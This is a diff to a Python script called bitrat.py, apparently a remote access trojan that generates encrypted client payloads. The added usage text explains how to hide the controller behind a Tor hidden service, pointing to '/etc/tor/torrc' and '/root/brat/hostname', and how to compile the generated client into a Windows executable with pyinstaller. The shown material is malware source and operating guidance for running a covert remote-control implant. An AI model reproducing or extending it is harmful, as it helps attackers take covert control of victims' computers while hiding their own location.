@@ -1,3 +1,5 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
 import readline, socket, sys, time, os, binascii
 from Crypto import Random
 from Crypto.Cipher import AES
@@ -58,6 +60,19 @@ except:
     logo()  
     print 'Usage: ./bitrat.py <port> <host> <key>'
     print "'./bitrat.py <port> <host> gen > example.py' to generate client."
+    print ""
+    print "               ----How to use Tor----"
+    print ""
+    print "To use TOR, add the lines below to -> '/etc/tor/torrc'"
+    print "HiddenServiceDir /root/brat/"
+    print "HiddenServicePort 80 127.0.0.1:5000"
+    print "Generate a client with the onion address shown in '/root/brat/hostname'"
+    print "Add the imports to the header of the client 'from torrequest import TorRequest'"
+    print ""
+    print "                ----Windows Hosts----"
+    print ""
+    print "To compile for a windows host. Use pyinstaller on the generated client."
+    print "Ex: './bitrat.py <port> <host> gen > example.py | pyinstaller ./example.py'"
     sys.exit(1)
 if GEN == 'gen':
     exit()
